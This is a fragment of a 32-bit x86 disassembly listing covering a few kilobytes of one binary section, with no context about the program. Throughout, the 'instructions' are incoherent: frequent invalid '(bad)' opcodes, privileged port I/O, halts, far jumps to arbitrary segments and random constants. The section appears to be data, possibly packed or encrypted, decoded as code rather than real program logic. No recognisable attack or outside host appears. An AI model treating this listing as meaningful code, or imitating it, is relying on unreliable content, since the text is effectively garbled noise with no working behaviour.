  4164a6:	and    eax,0xa7a7cece
  4164ab:	ds fwait
  4164ad:	xchg   edx,eax
  4164ae:	fild   QWORD PTR [ebp-0x3c]
  4164b1:	rcl    DWORD PTR ds:0x3e1bc7b,cl
  4164b7:	sub    DWORD PTR [eax],ecx
  4164b9:	nop
  4164ba:	daa    
  4164bb:	or     ch,0x78
  4164be:	(bad)
  4164c1:	addr16 jo 0x41650f
  4164c4:	sbb    DWORD PTR [edi],ebp
  4164c6:	or     al,0xc2
  4164c8:	pop    ebp
  4164c9:	push   0xffffff89
  4164cb:	jg     0x416488
  4164cd:	sbb    cl,BYTE PTR [ecx*8-0xf0f57b7]
  4164d4:	push   edx
  4164d5:	cld    
  4164d6:	sub    eax,DWORD PTR [edi+0x7fd34680]
  4164dc:	cmp    DWORD PTR [esi],ebx
  4164de:	lock xchg esi,eax
  4164e0:	cmp    al,0xa1
  4164e2:	add    eax,0xd625f570
  4164e7:	adc    DWORD PTR [ecx+0xa6955cd],ebp
  4164ed:	push   edx
  4164ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164ef:	cmp    BYTE PTR ds:0x895d0eac,ah
  4164f5:	stos   BYTE PTR es:[edi],al
  4164f6:	lods   al,BYTE PTR ds:[esi]
  4164f7:	dec    ecx
  4164f8:	cmp    al,0x6d
  4164fa:	mov    edx,DWORD PTR [edi]
  4164fc:	xchg   esp,eax
  4164fd:	stos   DWORD PTR es:[edi],eax
  4164fe:	adc    dl,ah
  416500:	in     al,dx
  416501:	enter  0x7f24,0xc6
  416505:	sbb    ecx,DWORD PTR [edi]
  416507:	cmp    eax,0x3c7f3a51
  41650c:	jb     0x4164d3
  41650e:	not    DWORD PTR [ecx]
  416510:	sub    BYTE PTR [eax-0x5d64a60b],0xae
  416517:	(bad)  
  416518:	adc    BYTE PTR [esi-0x2c14f7bd],ah
  41651e:	sbb    BYTE PTR [eax],dl
  416520:	dec    BYTE PTR [ecx-0x73505cb4]
  416526:	in     eax,dx
  416527:	jae    0x41653f
  416529:	loop   0x41654d
  41652b:	ret    
  41652c:	sub    al,0x83
  41652e:	pop    es
  41652f:	leave  
  416530:	mov    ecx,0xa1c9ff5d
  416535:	pop    ebp
  416536:	andps  xmm3,XMMWORD PTR [edx-0x21bd6790]
  41653d:	test   bl,ah
  41653f:	mov    dl,0x90
  416541:	enter  0x72f,0x41
  416545:	clc    
  416546:	mov    eax,ds:0xed792fb4
  41654b:	mov    al,ds:0x372a8b6f
  416550:	hlt    
  416551:	iret   
  416552:	js     0x41655b
  416554:	jmp    0x3cae:0x12c7fbb7
  41655b:	stos   DWORD PTR es:[edi],eax
  41655c:	inc    edx
  41655d:	push   ecx
  41655e:	ret    0xbf2d
  416561:	push   edx
  416562:	xor    BYTE PTR [edi],bl
  416564:	xor    ecx,edi
  416566:	mov    al,0xb2
  416568:	jae    0x41657c
  41656a:	mov    ds:0x31106ea,eax
  41656f:	push   ds
  416570:	xchg   dl,dl
  416572:	jl     0x416509
  416574:	lock rcr DWORD PTR [esp+ecx*8+0xc2d3a9e],1
  41657c:	or     eax,0xeead45de
  416581:	ds adc eax,0x7e26616a
  416587:	jne    0x4165de
  416589:	shr    DWORD PTR [ebx+0x5355b2],1
  41658f:	mov    edx,0x19e4d845
  416594:	pop    esi
  416595:	sub    BYTE PTR [eax],ch
  416597:	xchg   esp,eax
  416598:	jp     0x416562
  41659a:	daa    
  41659b:	xchg   ebp,eax
  41659c:	sbb    bh,BYTE PTR [eax+eiz*8-0x52]
  4165a0:	arpl   WORD PTR [ebx+0x68],bx
  4165a3:	push   0x93b0116f
  4165a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4165a9:	cwde   
  4165aa:	or     edi,DWORD PTR [ebx+0xa]
  4165ad:	mov    al,BYTE PTR [ebx-0x35]
  4165b0:	out    0xd8,al
  4165b2:	pop    ss
  4165b3:	fimul  DWORD PTR [eax+0x4]
  4165b6:	imul   esi,DWORD PTR [esi+0x3874e959],0xe50bbb42
  4165c0:	mov    esi,0x66f5a1f8
  4165c5:	mov    DWORD PTR [esi+0x2f722dcc],edi
  4165cb:	leave  
  4165cc:	(bad)  
  4165cd:	stc    
  4165ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4165cf:	cld    
  4165d0:	adc    DWORD PTR [eax],ebp
  4165d2:	push   cs
  4165d3:	(bad)  
  4165d4:	rcl    BYTE PTR [ecx-0x3e945135],cl
  4165da:	loopne 0x4165f3
  4165dc:	out    dx,al
  4165dd:	or     al,0x6b
  4165df:	jno    0x4165f5
  4165e1:	ror    BYTE PTR [esi+0x1b2f4a5d],1
  4165e7:	mov    eax,ds:0x31902044
  4165ec:	adc    ebp,DWORD PTR [edx+eiz*4]
  4165ef:	inc    BYTE PTR [eax-0x17]
  4165f2:	inc    esp
  4165f3:	inc    esi
  4165f4:	outs   dx,DWORD PTR ds:[esi]
  4165f5:	out    0x1a,eax
  4165f7:	sbb    dl,ch
  4165f9:	adc    eax,0x18f6eb91
  4165fe:	test   BYTE PTR ds:0x5b5139a3,ch
  416604:	push   edx
  416605:	aaa    
  416606:	mov    al,ds:0x3c0e919f
  41660b:	inc    ebp
  41660c:	pushf  
  41660d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41660e:	or     bl,BYTE PTR [ebx]
  416610:	push   es
  416611:	rol    BYTE PTR [edi],0xbe
  416614:	jo     0x41665c
  416616:	push   ebp
  416617:	push   edx
  416618:	clc    
  416619:	sbb    BYTE PTR [eax-0x5c],dh
  41661c:	jle    0x41665a
  41661e:	or     BYTE PTR [ebx+0x4ff13845],al
  416624:	outs   dx,DWORD PTR ds:[esi]
  416625:	nop
  416626:	xchg   edi,eax
  416627:	xor    BYTE PTR [ebx+0x2],ah
  41662a:	lahf   
  41662b:	ror    BYTE PTR [ebp-0x76b1cb4a],cl
  416631:	sahf   
  416632:	test   DWORD PTR [ebx],ecx
  416634:	inc    esi
  416635:	jle    0x4165c3
  416637:	cmp    eax,0xc9139c79
  41663c:	loope  0x416604
  41663e:	je     0x416638
  416640:	push   cs
  416641:	(bad)  
  416642:	and    eax,0xa6a29dfa
  416648:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416649:	je     0x416608
  41664b:	arpl   WORD PTR [eax],bx
  41664d:	leave  
  41664e:	mov    edi,DWORD PTR [ebp+0x18]
  416651:	scas   eax,DWORD PTR es:[edi]
  416652:	cld    
  416653:	hlt    
  416654:	mov    ebx,0x119405b1
  416659:	and    DWORD PTR [eax+ebp*1+0x32754f25],ebp
  416660:	add    DWORD PTR [ebp+edx*1+0x24e62003],0xf157bace
  41666b:	mov    esi,fs
  41666d:	jp     0x416659
  41666f:	inc    edx
  416670:	sbb    eax,0x83a660c0
  416675:	add    esp,DWORD PTR [ebx]
  416677:	int3   
  416678:	test   DWORD PTR [ebx-0x9],ebp
  41667b:	push   esi
  41667c:	or     esi,DWORD PTR [esi+edx*2]
  41667f:	jge    0x41661f
  416681:	jl     0x416651
  416683:	push   esi
  416684:	hlt    
  416685:	mov    ebx,0x3275dc32
  41668a:	jbe    0x41667c
  41668c:	and    eax,DWORD PTR [ebp-0x14]
  41668f:	pop    esp
  416690:	push   ebp
  416691:	cli    
  416692:	jmp    0xfb1594d3
  416697:	xchg   esi,eax
  416698:	push   ebp
  416699:	stc    
  41669a:	jg     0x416672
  41669c:	mov    al,ds:0x159e53d7
  4166a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4166a2:	out    dx,eax
  4166a3:	(bad)  
  4166a4:	ins    BYTE PTR es:[edi],dx
  4166a5:	ror    DWORD PTR [edx+0x3906eaa6],1
  4166ab:	sbb    DWORD PTR [edx-0x15a8fb1f],edi
  4166b1:	mov    bl,0x42
  4166b3:	dec    ebp
  4166b4:	mov    ds:0x3a7b0816,eax
  4166b9:	cmovnp esp,ebp
  4166bc:	(bad)  
  4166bd:	aad    0x56
  4166bf:	and    al,0x75
  4166c1:	mov    edx,0xfa7873d6
  4166c6:	xor    dh,bl
  4166c8:	mov    DWORD PTR [eax+0x2d],eax
  4166cb:	dec    ebx
  4166cc:	call   0x950f9549
  4166d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4166d2:	push   ebp
  4166d3:	pop    ecx
  4166d4:	mov    edx,0xa5ca7da8
  4166d9:	(bad)  
  4166dc:	js     0x416661
  4166de:	add    BYTE PTR [ebx-0x18],bh
  4166e1:	jb     0x416676
  4166e3:	mov    esi,0x4f41c361
  4166e8:	xchg   esp,eax
  4166e9:	xor    eax,0x8f6c7802
  4166ee:	mov    edx,0xa39f1b0
  4166f3:	loop   0x416706
  4166f5:	(bad)  
  4166f6:	xor    eax,0x98d0cf71
  4166fb:	pusha  
  4166fc:	ins    BYTE PTR es:[edi],dx
  4166fd:	into   
  4166fe:	jae    0x416714
  416700:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416701:	int    0x85
  416703:	push   eax
  416704:	sbb    BYTE PTR [edx+0x4f0370cf],al
  41670a:	dec    edx
  41670b:	mov    ss,WORD PTR [esi]
  41670d:	or     bl,BYTE PTR [esi+ebx*2+0x61a0f157]
  416714:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416715:	lods   eax,DWORD PTR ds:[esi]
  416716:	xor    ecx,eax
  416718:	lods   al,BYTE PTR ds:[esi]
  416719:	sub    ch,cl
  41671b:	int    0x78
  41671d:	pop    ss
  41671e:	xchg   esi,eax
  41671f:	popf   
  416720:	fcmovnbe st,st(0)
  416722:	ffreep st(6)
  416724:	adc    ch,cl
  416726:	aas    
  416727:	test   dl,dh
  416729:	arpl   ax,di
  41672b:	or     al,BYTE PTR [eax]
  41672d:	dec    edi
  41672e:	fbld   TBYTE PTR [edi-0x13645e12]
  416734:	and    ch,0x4f
  416737:	xchg   esp,eax
  416738:	ja     0x416750
  41673a:	call   0x82dd81ee
  41673f:	mov    dh,0xf2
  416741:	xchg   ebx,eax
  416742:	(bad)  
  416743:	fimul  DWORD PTR [ebx+0x12a341c6]
  416749:	sub    eax,0x25a20dae
  41674e:	xlat   BYTE PTR ds:[ebx]
  41674f:	or     eax,0xb1525d27
  416754:	cdq    
  416755:	les    esi,FWORD PTR [eax+0x51f9dec0]
  41675b:	mov    ah,0x79
  41675d:	in     eax,dx
  41675e:	push   ecx
  41675f:	adc    DWORD PTR [ecx],0xffffff9f
  416762:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  416764:	jne    0x41677d
  416766:	inc    edi
  416767:	icebp  
  416768:	cld    
  416769:	add    DWORD PTR [edi+0x58909aac],ecx
  41676f:	and    ah,dh
  416771:	xor    BYTE PTR [ebx],ch
  416773:	sbb    ch,BYTE PTR ds:0x36dbf8bd
  416779:	out    dx,al
  41677a:	popf   
  41677b:	loopne 0x416744
  41677d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41677e:	outs   dx,DWORD PTR ds:[esi]
  41677f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416780:	mov    WORD PTR [eax],ds
  416782:	in     eax,dx
  416783:	stos   BYTE PTR es:[edi],al
  416784:	in     eax,dx
  416785:	jb     0x4167db
  416787:	(bad)  [eax+esi*8-0x4b]
  41678b:	and    BYTE PTR [ebx+esi*4-0x6b],ah
  41678f:	push   0xa3bd51f8
  416794:	mov    esi,0xd31aeda0
  416799:	xor    al,0xb6
  41679b:	mov    ch,0xaa
  41679d:	xchg   ecx,eax
  41679e:	sbb    edi,DWORD PTR [edi]
  4167a0:	xchg   ecx,eax
  4167a1:	js     0x416792
  4167a3:	push   es
  4167a4:	xchg   edx,eax
  4167a5:	add    esp,0x5e
  4167a8:	and    BYTE PTR [edi+0x3185206a],dh
  4167ae:	pop    edx
  4167af:	sahf   
  4167b0:	ret    
  4167b1:	arpl   sp,sp
  4167b3:	jbe    0x4167ed
  4167b5:	xor    DWORD PTR [eax+0x6489631d],ebx
  4167bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4167bc:	(bad)  
  4167bd:	jne    0x416818
  4167bf:	sub    al,0x82
  4167c1:	dec    edi
  4167c2:	gs jne 0x4167b1
  4167c5:	add    BYTE PTR [ecx-0x4fd8d32d],dh
  4167cb:	inc    edx
  4167cc:	pop    edx
  4167cd:	clc    
  4167ce:	xor    ecx,0xfffffffe
  4167d1:	scas   eax,DWORD PTR es:[edi]
  4167d2:	push   ecx
  4167d3:	add    dl,BYTE PTR [ebp+0x5deb923d]
  4167d9:	sar    BYTE PTR [ebp-0x68],cl
  4167dc:	stos   BYTE PTR es:[edi],al
  4167dd:	popa   
  4167de:	xchg   BYTE PTR [edx],ah
  4167e0:	add    eax,0x9428c135
  4167e5:	jns    0x416805
  4167e7:	sub    dh,dh
  4167e9:	lock pop edx
  4167eb:	xchg   DWORD PTR [esi-0x29],esi
  4167ee:	mov    ah,0x9e
  4167f0:	loopne 0x416777
  4167f2:	lods   eax,DWORD PTR ds:[esi]
  4167f3:	jmp    FWORD PTR [ecx]
  4167f5:	or     BYTE PTR [ecx+0x29939c0f],dh
  4167fb:	xchg   edi,eax
  4167fc:	pop    ds
  4167fd:	into   
  4167fe:	mov    cs,edx
  416800:	sub    ch,BYTE PTR [edi+0x15]
  416803:	dec    ebp
  416804:	popa   
  416805:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416806:	imul   ebp,DWORD PTR [ebx-0x3],0x5abd3536
  41680d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41680e:	out    dx,eax
  41680f:	arpl   WORD PTR [esi+0x3c],sp
  416812:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416813:	cld    
  416814:	push   0xffffffcc
  416816:	mov    WORD PTR [eax+0x16cea3d2],?
  41681c:	or     cl,al
  41681e:	jp     0x41686e
  416820:	mov    bl,0x72
  416822:	jns    0x416857
  416824:	jmp    0x3a23194f
  416829:	and    esi,DWORD PTR [ebx]
  41682b:	inc    eax
  41682c:	neg    BYTE PTR [esi+0x33]
  41682f:	loope  0x41685a
  416831:	lock add ecx,edx
  416834:	in     al,dx
  416835:	lea    esi,[eax+0x5f4c71ad]
  41683b:	fcomp  QWORD PTR [ebp-0x31e783d5]
  416841:	aad    0x2a
  416843:	jne    0x416878
  416845:	mov    ah,dh
  416847:	fcmovne st,st(2)
  416849:	mov    esp,0xa8dfa082
  41684e:	imul   eax,ecx,0x57
  416851:	in     al,0xba
  416853:	jle    0x416801
  416855:	cmp    BYTE PTR [edi+0x7a],ch
  416858:	stc    
  416859:	and    ebx,edi
  41685b:	mov    WORD PTR [eax+0x14],fs
  41685e:	push   edi
  41685f:	scas   al,BYTE PTR es:[edi]
  416860:	loopne 0x4167f0
  416862:	jge    0x4168c8
  416864:	push   ecx
  416865:	jo     0x416807
  416867:	mov    eax,ds:0x96a483e1
  41686c:	test   eax,0x41b87dc3
  416871:	sar    DWORD PTR [edx],0xdc
  416874:	shl    BYTE PTR [edx+0x6be73bbd],1
  41687a:	dec    ebp
  41687b:	adc    esp,DWORD PTR [edi+0x4a53ddcb]
  416881:	(bad)  
  416882:	push   ebx
  416883:	xor    ch,BYTE PTR [ebp-0x6c]
  416886:	(bad)  
  416887:	mov    ds:0x24527b2d,eax
  41688c:	es jbe 0x416868
  41688f:	pop    esp
  416890:	dec    ebp
  416891:	xchg   ebp,eax
  416892:	clc    
  416893:	loope  0x416890
  416895:	inc    edx
  416896:	pop    edx
  416897:	push   esi
  416898:	push   esp
  416899:	mov    ebp,?
  41689b:	mov    esi,0x2d8b6830
  4168a0:	push   eax
  4168a1:	hlt    
  4168a2:	fidiv  WORD PTR [esi+eiz*8-0x1b]
  4168a6:	and    esp,DWORD PTR [eax]
  4168a8:	(bad)  
  4168aa:	outs   dx,DWORD PTR ds:[esi]
  4168ab:	ret    0xa83b
  4168ae:	mov    dh,0x3d
  4168b0:	jns    0x4168a6
  4168b2:	daa    
  4168b3:	jg     0x416860
  4168b5:	pop    esp
  4168b6:	jle    0x416901
  4168b8:	inc    eax
  4168b9:	ss or  dl,al
  4168bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4168bd:	cmp    eax,0xdb3aff30
  4168c2:	xchg   ebx,eax
  4168c3:	pop    edi
  4168c4:	fdivr  QWORD PTR [ebx+0x12e3d4e9]
  4168ca:	inc    esi
  4168cb:	cdq    
  4168cc:	out    dx,al
  4168cd:	outs   dx,DWORD PTR ds:[esi]
  4168ce:	sti    
  4168cf:	mov    esi,0x85108bad
  4168d4:	or     BYTE PTR [esi-0x65],dh
  4168d7:	push   esi
  4168d8:	retf   
  4168d9:	cmp    BYTE PTR [ecx-0x558fb262],dl
  4168df:	rol    BYTE PTR [edi-0x7b3ba84],0x37
  4168e6:	mov    cl,0xba
  4168e8:	aas    
  4168e9:	test   al,0x52
  4168eb:	jg     0x416915
  4168ed:	(bad)  
  4168ee:	std    
  4168ef:	ror    BYTE PTR [ecx+eax*2],0x2b
  4168f3:	cdq    
  4168f4:	out    dx,eax
  4168f5:	cdq    
  4168f6:	(bad)  
  4168f7:	adc    al,BYTE PTR [ebx+ebp*4]
  4168fa:	dec    esi
  4168fb:	xchg   ebx,eax
  4168fc:	dec    esi
  4168fd:	add    esi,esp
  4168ff:	xchg   edi,eax
  416900:	(bad)  
  416901:	fisubr WORD PTR [ecx]
  416903:	pop    edx
  416904:	pmaxsw mm4,mm5
  416907:	mov    bh,0x32
  416909:	sub    al,0x54
  41690b:	inc    esp
  41690c:	push   ecx
  41690d:	stos   BYTE PTR es:[edi],al
  41690e:	and    dl,BYTE PTR [ecx-0x58]
  416911:	cs in  eax,0xf3
  416914:	jl     0x416955
  416916:	or     BYTE PTR [edi],0xbf
  416919:	sbb    ch,ch
  41691b:	call   0x4bd8f1b3
  416920:	push   ss
  416921:	loopne 0x416938
  416923:	mov    bl,0x66
  416925:	add    al,0xdf
  416927:	mov    esp,0x2cc58ea5
  41692c:	cwde   
  41692d:	cdq    
  41692e:	and    eax,0x5e991b7c
  416933:	fst    QWORD PTR [edi]
  416935:	test   dh,bl
  416937:	push   cs
  416938:	dec    esp
  416939:	(bad)  
  41693a:	les    esp,FWORD PTR [eax-0x1d]
  41693d:	aad    0xdc
  41693f:	adc    eax,0xa0d051bd
  416944:	mov    eax,ds:0x5b650979
  416949:	mov    bl,0x46
  41694b:	sub    al,ah
  41694d:	mov    dl,0xaf
  41694f:	in     eax,0x28
  416951:	pop    ebx
  416952:	adc    BYTE PTR [edx+0xb54ab7e],dl
  416958:	aas    
  416959:	xchg   ebx,eax
  41695a:	mov    DWORD PTR [eax+eiz*4+0x55],esp
  41695e:	add    eax,0x4d673ea3
  416963:	imul   ebp,esi,0x20f264cd
  416969:	popf   
  41696a:	mov    bl,0xb3
  41696c:	jmp    0x416938
  41696e:	sub    cl,al
  416970:	stos   DWORD PTR es:[edi],eax
  416971:	sti    
  416972:	sub    eax,0x76fff587
  416977:	shr    DWORD PTR [ebx-0x76],cl
  41697a:	cmc    
  41697b:	mov    bl,0x3a
  41697d:	adc    BYTE PTR [ebp+0x45508a21],bh
  416983:	je     0x4169ea
  416985:	ins    DWORD PTR es:[edi],dx
  416986:	push   edi
  416987:	mov    ecx,0xcd5983db
  41698c:	fbld   TBYTE PTR [ebx+0x4b2752cf]
  416992:	jbe    0x416914
  416994:	jg     0x416a00
  416996:	push   esp
  416997:	push   edx
  416998:	cld    
  416999:	xchg   ebp,eax
  41699a:	pushf  
  41699b:	and    ch,dl
  41699d:	or     al,0xb9
  41699f:	push   ebp
  4169a0:	fnstenv ds:0x64a9aff8
  4169a6:	mov    bl,BYTE PTR [eax+0x35]
  4169a9:	rol    BYTE PTR [ecx-0x2c85339a],cl
  4169af:	mov    ?,WORD PTR [eax+edi*8-0x78]
  4169b3:	repnz imul esp,edx,0x9da01907
  4169ba:	pop    ecx
  4169bb:	push   cs
  4169bc:	jmp    0xc1fe:0x6d6bf4b4
  4169c3:	nop
  4169c4:	pop    esp
  4169c5:	int    0x87
  4169c7:	rcl    cl,cl
  4169c9:	and    eax,0xc470687f
  4169ce:	mov    eax,ds:0x2e24485c
  4169d3:	xor    esi,ebp
  4169d5:	popa   
  4169d6:	lock inc ebx
  4169d8:	cwde   
  4169d9:	mov    esp,0x827e91a7
  4169de:	sbb    eax,0xc6b3b106
  4169e3:	pop    ss
  4169e4:	das    
  4169e5:	cmp    ebx,DWORD PTR [esi-0x78]
  4169e8:	(bad)  
  4169e9:	ins    BYTE PTR es:[edi],dx
  4169ea:	mov    esp,0xf9ed0587
  4169ef:	push   edx
  4169f0:	fcomp  QWORD PTR [ebx+0x7b9e6854]
  4169f6:	mov    edx,0xacec3b91
  4169fb:	mov    esp,0x4e09f7fd
  416a00:	or     cl,BYTE PTR [edi+ebx*8]
  416a03:	add    al,BYTE PTR [edx+0x7f]
  416a06:	fwait
  416a07:	stos   DWORD PTR es:[edi],eax
  416a08:	or     BYTE PTR [edx-0x2b],cl
  416a0b:	je     0x416a21
  416a0d:	mov    sp,0x40a5
  416a11:	jo     0x416a03
  416a13:	lock xor ah,BYTE PTR [ecx]
  416a16:	shr    DWORD PTR [edx],1
  416a18:	(bad)  
  416a19:	and    ebx,DWORD PTR [ecx+0x62eef4a3]
  416a1f:	addr16 sahf 
  416a21:	mov    edx,0x4036aec3
  416a26:	push   ss
  416a27:	mov    esi,0xc5270a34
  416a2c:	push   ebp
  416a2d:	jmp    0xfb542f66
  416a32:	mov    WORD PTR [esi+0x8655cdb],gs
  416a38:	inc    ebx
  416a39:	test   eax,ecx
  416a3b:	jo     0x416a07
  416a3d:	dec    ebx
  416a3e:	mov    al,ds:0x39072673
  416a43:	loope  0x4169c7
  416a45:	sbb    BYTE PTR [esp+0x9d70e57],ch
  416a4c:	pop    ebx
  416a4d:	mov    eax,0xa7eb30b1
  416a52:	sti    
  416a53:	dec    eax
  416a54:	xor    BYTE PTR [ecx],ah
  416a56:	call   0x956f:0xf40dc0f0
  416a5d:	cmp    esp,edx
  416a5f:	popa   
  416a60:	add    al,0x4c
  416a62:	or     al,0x3b
  416a64:	daa    
  416a65:	xor    BYTE PTR [edx+0x4df91aaf],ch
  416a6b:	or     eax,0xabc91069
  416a70:	push   eax
  416a71:	push   esi
  416a72:	arpl   WORD PTR [ebp-0x7bcd1abe],di
  416a78:	imul   ebx,DWORD PTR [edi+0x76],0x8c307fe0
  416a7f:	gs jmp 0x94cc:0x583d22fc
  416a87:	or     eax,0x72be8494
  416a8c:	xchg   edi,eax
  416a8d:	sbb    eax,0x76165b50
  416a92:	je     0x416a9e
  416a94:	int3   
  416a95:	in     eax,0xbd
  416a97:	inc    eax
  416a98:	adc    DWORD PTR cs:[ebp-0x1a],0x6d
  416a9d:	ins    BYTE PTR es:[edi],dx
  416a9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a9f:	ror    esi,1
  416aa1:	sub    al,0x6c
  416aa3:	popf   
  416aa4:	sar    esi,1
  416aa6:	xchg   BYTE PTR [ebx],al
  416aa8:	mov    WORD PTR [edx],ss
  416aaa:	js     0x416a7b
  416aac:	sbb    ah,BYTE PTR [ebx+0x1a]
  416aaf:	in     al,0x92
  416ab1:	jp     0x416b00
  416ab3:	or     BYTE PTR [ebp+0x63],dh
  416ab6:	inc    esi
  416ab7:	xchg   edx,eax
  416ab8:	loop   0x416b16
  416aba:	and    esp,ebx
  416abc:	shl    eax,0xcb
  416abf:	aam    0x70
  416ac1:	xor    dl,BYTE PTR ds:0xd7206bfa
  416ac7:	imul   esi,DWORD PTR [esp+ebp*1+0x56],0x298c5443
  416acf:	lahf   
  416ad0:	push   es
  416ad1:	ins    DWORD PTR es:[edi],dx
  416ad2:	push   esp
  416ad3:	not    BYTE PTR [edi-0x4]
  416ad6:	adc    BYTE PTR [eax+0x4b1a929b],al
  416adc:	sub    al,0xfa
  416ade:	push   ecx
  416adf:	xchg   esp,eax
  416ae0:	test   al,0x46
  416ae2:	popa   
  416ae3:	mov    edi,0x7558ee73
  416ae8:	sub    DWORD PTR [ecx+0x6976b967],ebx
  416aee:	pop    ebx
  416aef:	in     eax,0x93
  416af1:	sub    al,0xc6
  416af3:	or     ebp,DWORD PTR [edx-0x5c]
  416af6:	jae    0x416b1d
  416af8:	pop    eax
  416af9:	imul   edx,DWORD PTR [edi],0x552152e0
  416aff:	sub    DWORD PTR [ebx+0x72101ca9],eax
  416b05:	jge    0x416b29
  416b07:	out    0xce,al
  416b09:	jnp    0x416ad9
  416b0b:	loop   0x416ade
  416b0d:	dec    edi
  416b0e:	call   0x62a:0x9e7753dd
  416b15:	lock es jmp 0x416abe
  416b19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b1a:	adc    DWORD PTR [eax],0x38cfba9b
  416b20:	add    DWORD PTR [ecx],ecx
  416b22:	jbe    0x416b2d
  416b24:	and    eax,0xc6983c19
  416b29:	jo     0x416b51
  416b2b:	bound  ebp,QWORD PTR [edi]
  416b2d:	pushf  
  416b2e:	gs pop es
  416b30:	lea    eax,[ecx-0x8]
  416b33:	or     al,0x71
  416b35:	loop   0x416acf
  416b37:	rcl    ecx,cl
  416b39:	popf   
  416b3a:	inc    ecx
  416b3b:	and    DWORD PTR [edi],ecx
  416b3d:	xchg   ebx,eax
  416b3e:	mov    ebp,0x95445cee
  416b43:	jl     0x416b07
  416b45:	mov    esi,0x2066a4bf
  416b4a:	test   BYTE PTR [edi],ch
  416b4c:	inc    eax
  416b4d:	add    eax,0x1c0ccf5a
  416b52:	and    esp,DWORD PTR [esp+ebx*8]
  416b55:	rol    BYTE PTR [edx],0xe
  416b58:	cmp    al,0xd
  416b5a:	or     BYTE PTR [edi+edi*8-0x4c969ea5],al
  416b61:	mov    ecx,0xf827ded9
  416b66:	pushf  
  416b67:	xchg   ecx,eax
  416b68:	cmp    al,0xaf
  416b6a:	(bad)
  416b6d:	or     edx,DWORD PTR [ebp+0x7af65dd6]
  416b73:	xchg   ecx,eax
  416b74:	jge    0x416b01
  416b76:	pop    esi
  416b77:	cmc    
  416b78:	repnz bswap ebp
  416b7b:	nop
  416b7c:	add    eax,0x7de5bf2b
  416b81:	mov    edx,0x574a4d0b
  416b86:	(bad)  
  416b87:	into   
  416b88:	mov    BYTE PTR [ecx+0x5ed811ea],bh
  416b8e:	aam    0x7f
  416b90:	cmp    dh,0x5e
  416b93:	push   esp
  416b94:	nop
  416b95:	ins    BYTE PTR es:[edi],dx
  416b96:	or     eax,0x40b09d39
  416b9b:	sbb    DWORD PTR [ebp+0x7],edi
  416b9e:	imul   ecx,DWORD PTR [eax+0x2dcdbe66],0xe5fc0dc1
  416ba8:	add    eax,0x49584522
  416bad:	cmpps  xmm0,XMMWORD PTR [edx-0x65],0xd9
  416bb2:	nop
  416bb3:	sub    bl,ah
  416bb5:	retf   0xf187
  416bb8:	jmp    0x5d06:0xb5986ddc
  416bbf:	loope  0x416bee
  416bc1:	int3   
  416bc2:	ds stos DWORD PTR es:[edi],eax
  416bc4:	pop    ecx
  416bc5:	(bad)  
  416bc7:	sahf   
  416bc8:	arpl   WORD PTR [esi],bx
  416bca:	cmp    eax,0x625d6404
  416bcf:	xchg   ecx,eax
  416bd0:	rcr    BYTE PTR cs:[edi+0x6f],cl
  416bd4:	and    DWORD PTR [ecx+0x693cba92],ebx
  416bda:	pop    esp
  416bdb:	sahf   
  416bdc:	aam    0x39
  416bde:	sbb    DWORD PTR [edx],esi
  416be0:	into   
  416be1:	pop    edi
  416be2:	or     BYTE PTR [ebp-0x6b],cl
  416be5:	sub    DWORD PTR [esi-0x2c531a0e],0x7
  416bec:	popf   
  416bed:	pusha  
  416bee:	mov    ds:0x7d7e75e5,al
  416bf3:	add    BYTE PTR [esi+0x5d31d4bf],ch
  416bf9:	push   cs
  416bfa:	push   ecx
  416bfb:	rcr    DWORD PTR [ebx-0x7bffcbf3],cl
  416c01:	add    al,0x2d
  416c03:	(bad)  
  416c04:	int3   
  416c05:	cmp    ebx,DWORD PTR [edx]
  416c07:	mov    bl,0xb6
  416c09:	inc    edx
  416c0a:	mov    ecx,0xaa25a214
  416c0f:	xor    al,0x67
  416c11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c12:	daa    
  416c13:	push   eax
  416c14:	mov    ecx,0x6b9fa322
  416c19:	cwde   
  416c1a:	or     eax,DWORD PTR [ebp+0x61]
  416c1d:	into   
  416c1e:	jge    0x416c6d
  416c20:	jle    0x416bbe
  416c22:	mov    esp,0xa7baffca
  416c27:	sub    al,BYTE PTR [edi]
  416c29:	and    al,0xb
  416c2b:	jp     0x416bdb
  416c2d:	push   esp
  416c2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c30:	cld    
  416c31:	lds    esi,FWORD PTR ds:0x4a26834f
  416c37:	lea    edi,ds:[ebx-0x77]
  416c3b:	dec    esp
  416c3c:	mov    al,ds:0x7883af45
  416c41:	aas    
  416c42:	jecxz  0x416c5f
  416c44:	sbb    bh,BYTE PTR [edx+0x75]
  416c47:	ret    
  416c48:	fisub  WORD PTR [edx]
  416c4a:	lds    ebx,FWORD PTR [ebp-0x281aa863]
  416c50:	dec    edx
  416c51:	and    ebx,ebp
  416c53:	dec    ecx
  416c54:	xor    eax,0x80651290
  416c59:	lahf   
  416c5a:	mov    eax,0x986a303a
  416c5f:	ins    DWORD PTR es:[edi],dx
  416c60:	out    0x8c,al
  416c62:	mov    ah,0xa5
  416c64:	test   DWORD PTR [ebx+0x60],eax
  416c67:	cdq    
  416c68:	mov    esi,0xf968ad3c
  416c6d:	lahf   
